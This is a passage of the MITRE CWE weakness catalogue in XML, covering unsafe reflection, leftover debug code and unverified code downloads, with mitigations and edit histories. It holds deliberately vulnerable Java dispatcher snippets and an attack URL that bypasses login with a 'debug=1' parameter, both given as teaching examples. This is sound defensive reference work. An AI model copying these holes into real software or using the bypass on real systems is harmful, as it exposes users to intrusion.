         <Extended_Description>If the product uses external inputs to determine which class to instantiate or which method to invoke, then an attacker could supply values to select unexpected classes or methods. If this occurs, then the attacker could create control flow paths that were not intended by the developer. These paths could bypass authentication or access control checks, or otherwise cause the product to behave in an unexpected manner. This situation becomes a doomsday scenario if the attacker can upload files into a location that appears on the product's classpath (CWE-427) or add new entries to the product's classpath (CWE-426). Under either of these conditions, the attacker can use reflection to introduce new, malicious behavior into the product.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="913" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="913" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="610" View_ID="1000"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="20" View_ID="700" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Name="Java" Prevalence="Undetermined"/>
            <Language Name="PHP" Prevalence="Undetermined"/>
            <Language Class="Interpreted" Prevalence="Sometimes"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Reflection Injection</Term>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Scope>Other</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Impact>Alter Execution Logic</Impact>
               <Note>The attacker might be able to execute code that is not directly accessible to the attacker. Alternately, the attacker could call unexpected code in the wrong place or the wrong time, possibly modifying critical system state.</Note>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Scope>Other</Scope>
               <Impact>DoS: Crash, Exit, or Restart</Impact>
               <Impact>Other</Impact>
               <Note>The attacker might be able to use reflection to call the wrong code, possibly with unexpected arguments that violate the API (CWE-227). This could cause the product to exit or hang.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>By causing the wrong code to be invoked, the attacker might be able to trigger a runtime error that leaks sensitive information in the error message, such as CWE-536.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
           <Detection_Method Detection_Method_ID="DM-14">
             <Method>Automated Static Analysis</Method>
             <Description>Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect "sources" (origins of input) with "sinks" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)</Description>
             <Effectiveness>High</Effectiveness>
           </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Refactor your code to avoid using reflection.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Do not use user-controlled inputs to select and load classes or code.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Apply strict input validation by using allowlists or indirect selection to ensure that the user is only selecting allowable classes or code.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>A common reason that programmers use the reflection API is to implement their own command dispatcher. The following example shows a command dispatcher that does not use reflection:</Intro_Text>
               <Example_Code Nature="Good" Language="Java">
                  <xhtml:div>String ctl = request.getParameter("ctl");<xhtml:br/>Worker ao = null;<xhtml:br/>if (ctl.equals("Add")) {<xhtml:div style="margin-left:1em;">ao = new AddCommand();</xhtml:div>}<xhtml:br/>else if (ctl.equals("Modify")) {<xhtml:div style="margin-left:1em;">ao = new ModifyCommand();</xhtml:div>}<xhtml:br/>else {<xhtml:div style="margin-left:1em;">throw new UnknownActionError();</xhtml:div>}<xhtml:br/>ao.doAction(request);</xhtml:div>
               </Example_Code>
               <Body_Text>A programmer might refactor this code to use reflection as follows:</Body_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>String ctl = request.getParameter("ctl");<xhtml:br/>Class cmdClass = Class.forName(ctl + "Command");<xhtml:br/>Worker ao = (Worker) cmdClass.newInstance();<xhtml:br/>ao.doAction(request);</xhtml:div>
               </Example_Code>
               <Body_Text>The refactoring initially appears to offer a number of advantages. There are fewer lines of code, the if/else blocks have been entirely eliminated, and it is now possible to add new command types without modifying the command dispatcher. However, the refactoring allows an attacker to instantiate any object that implements the Worker interface. If the command dispatcher is still responsible for access control, then whenever programmers create a new class that implements the Worker interface, they must remember to modify the dispatcher's access control code. If they do not modify the access control code, then some Worker classes will not have any access control.</Body_Text>
               <Body_Text>One way to address this access control problem is to make the Worker object responsible for performing the access control check. An example of the re-refactored code follows:</Body_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>String ctl = request.getParameter("ctl");<xhtml:br/>Class cmdClass = Class.forName(ctl + "Command");<xhtml:br/>Worker ao = (Worker) cmdClass.newInstance();<xhtml:br/>ao.checkAccessControl(request);<xhtml:br/>ao.doAction(request);</xhtml:div>
               </Example_Code>
               <Body_Text>Although this is an improvement, it encourages a decentralized approach to access control, which makes it easier for programmers to make access control mistakes. This code also highlights another security problem with using reflection to build a command dispatcher. An attacker can invoke the default constructor for any kind of object. In fact, the attacker is not even constrained to objects that implement the Worker interface; the default constructor for any object in the system can be invoked. If the object does not implement the Worker interface, a ClassCastException will be thrown before the assignment to ao, but if the constructor performs operations that work in the attacker's favor, the damage will already have been done. Although this scenario is relatively benign in simple products, in larger products where complexity grows exponentially it is not unreasonable that an attacker could find a constructor to leverage as part of an attack.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2018-1000613</Reference>
               <Description>Cryptography API uses unsafe reflection when deserializing a private key</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2018-1000613</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-2331</Reference>
               <Description>Database system allows attackers to bypass sandbox restrictions by using the Reflection API.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-2331</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Unsafe Reflection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>SEC06-J</Entry_ID>
               <Entry_Name>Do not use reflection to increase accessibility of classes, methods, or fields</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="138"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-6"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Content_History>
            <Submission>
               <Submission_Name>7 Pernicious Kingdoms</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>KDM Analytics</Modification_Organization>
               <Modification_Date>2008-08-01</Modification_Date>
               <Modification_Comment>added/updated white box definitions</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Description, Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Description, Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Observed_Examples, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated White_Box_Definitions</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Description, Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Detection_Factors, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-10-26</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Unsafe Reflection</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">Use of Externally-Controlled Input to Select Classes or Code (aka 'Unsafe Reflection')</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="489" Name="Active Debug Code" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product is deployed to unauthorized actors with debugging code still enabled or active, which can create unintended entry points or expose sensitive information.</Description>
         <Extended_Description>A common development practice is to add "back door" code specifically designed for debugging or testing purposes that is not intended to be shipped or deployed with the product. These back door entry points create security risks because they are not considered during design or testing and fall outside of the expected operating conditions of the product.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="710" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="215" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Indirect</Ordinality>
            </Weakness_Ordinality>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
			<Technology Class="Not Technology-Specific" Prevalence="Undetermined"/>
			<Technology Class="ICS/OT" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Leftover debug code</Term>
	       <Description>This term originates from Seven Pernicious Kingdoms</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>In web-based applications, debug code is used to test and modify web application properties, configuration information, and functions. If a debug application is left on a production server, this oversight during the "software process" allows attackers access to debug functionality.</Note>
            </Introduction>
            <Introduction>
               <Phase>Build and Compilation</Phase>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Scope>Access Control</Scope>
               <Scope>Other</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Read Application Data</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Varies by Context</Impact>
               <Note>The severity of the exposed debug application will depend on the particular instance. At the least, it will give an attacker sensitive information about the settings and mechanics of web applications on the server. At worst, as is often the case, the debug application will allow an attacker complete control over the web application and server, as well as confidential information that either of these access.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
           <Detection_Method Detection_Method_ID="DM-14">
             <Method>Automated Static Analysis</Method>
             <Description>Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect "sources" (origins of input) with "sinks" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)</Description>
             <Effectiveness>High</Effectiveness>
           </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Build and Compilation</Phase>
               <Phase>Distribution</Phase>
               <Description>Remove debug code before deploying the application.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>Debug code can be used to bypass authentication. For example, suppose an application has a login script that receives a username and a password. Assume also that a third, optional, parameter, called "debug", is interpreted by the script as requesting a switch to debug mode, and that when this parameter is given the username and password are not checked. In such a case, it is very simple to bypass the authentication process if the special behavior of the application regarding the debug parameter is known. In a case where the form is:</Intro_Text>
               <Example_Code Nature="Bad" Language="HTML">
                  <xhtml:div>&lt;FORM ACTION="/authenticate_login.cgi"&gt;<xhtml:div style="margin-left:1em;">&lt;INPUT TYPE=TEXT name=username&gt;<xhtml:br/>&lt;INPUT TYPE=PASSWORD name=password&gt;<xhtml:br/>&lt;INPUT TYPE=SUBMIT&gt;</xhtml:div>&lt;/FORM&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>Then a conforming link will look like:</Body_Text>
               <Example_Code Nature="Informative">
                  <xhtml:div>http://TARGET/authenticate_login.cgi?username=...&amp;password=...</xhtml:div>
               </Example_Code>
               <Body_Text>An attacker can change this to:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>http://TARGET/authenticate_login.cgi?username=&amp;password=&amp;debug=1</xhtml:div>
               </Example_Code>
               <Body_Text>Which will grant the attacker access to the site, bypassing the authentication process.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Leftover Debug Code</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A10</Entry_ID>
               <Entry_Name>Insecure Configuration Management</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP28</Entry_ID>
               <Entry_Name>Unexpected access points</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="121"/>
            <Related_Attack_Pattern CAPEC_ID="661"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-6"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Other">In J2EE a main method may be a good indicator that debug code has been left in the application, although there may not be any direct security impact.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>7 Pernicious Kingdoms</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>KDM Analytics</Modification_Organization>
               <Modification_Date>2008-08-01</Modification_Date>
               <Modification_Comment>added/updated white box definitions</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Description, Modes_of_Introduction, Other_Notes, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Relationships, White_Box_Definitions</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Weakness_Ordinalities</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Description, Name, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Alternate_Terms</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Description, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Detection_Factors, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
			<Previous_Entry_Name Date="2020-02-24">Leftover Debug Code</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="494" Name="Download of Code Without Integrity Check" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product downloads source code or an executable from a remote location and executes the code without sufficiently verifying the origin and integrity of the code.</Description>
         <Extended_Description>An attacker can execute malicious code by compromising the host server, performing DNS spoofing, or modifying the code in transit.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="345" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="669" View_ID="1000"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="669" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Other</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Impact>Alter Execution Logic</Impact>
               <Impact>Other</Impact>
               <Note>Executing untrusted code could compromise the control flow of the program. The untrusted code could execute attacker-controlled commands, read or modify sensitive resources, or prevent the software from functioning correctly for legitimate users.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-7.4">
               <Method>Manual Analysis</Method>
               <Description>
                  <xhtml:p>This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.</xhtml:p>
                  <xhtml:p>Specifically, manual static analysis is typically required to find the behavior that triggers the download of code, and to determine whether integrity-checking methods are in use.</xhtml:p>
               </Description>
               <Effectiveness_Notes>These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-11">
               <Method>Black Box</Method>
               <Description>
                  <xhtml:p>Use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.</xhtml:p>
                  <xhtml:p>Attach the monitor to the process and also sniff the network connection. Trigger features related to product updates or plugin installation, which is likely to force a code download. Monitor when files are downloaded and separately executed, or if they are otherwise read back into the process. Look for evidence of cryptographic library calls that use integrity checking.</xhtml:p>
               </Description>
            </Detection_Method>
           <Detection_Method Detection_Method_ID="DM-14">
             <Method>Automated Static Analysis</Method>
             <Description>Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect "sources" (origins of input) with "sinks" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)</Description>
             <Effectiveness>High</Effectiveness>
           </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-42">
               <Phase>Implementation</Phase>
               <Description>Perform proper forward and reverse DNS lookups to detect DNS spoofing.</Description>
               <Effectiveness_Notes>This is only a partial solution since it will not prevent your code from being modified on the hosting site or in transit.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Description>
                  <xhtml:p>Encrypt the code with a reliable encryption scheme before transmitting.</xhtml:p>
                  <xhtml:p>This will only be a partial solution, since it will not detect DNS spoofing and it will not prevent your code from being modified on the hosting site.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>Speficially, it may be helpful to use tools or frameworks to perform integrity checking on the transmitted code.</xhtml:p>
                     <xhtml:ul>
                        <xhtml:li>When providing the code that is to be downloaded, such as for automatic updates of the software, then use cryptographic signatures for the code and modify the download clients to verify the signatures. Ensure that the implementation does not contain CWE-295, CWE-320, CWE-347, and related weaknesses.</xhtml:li>
                        <xhtml:li>Use code signing technologies such as Authenticode. See references [REF-454] [REF-455] [REF-456].</xhtml:li>
                     </xhtml:ul>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-17">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-22">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Sandbox or Jail</Strategy>
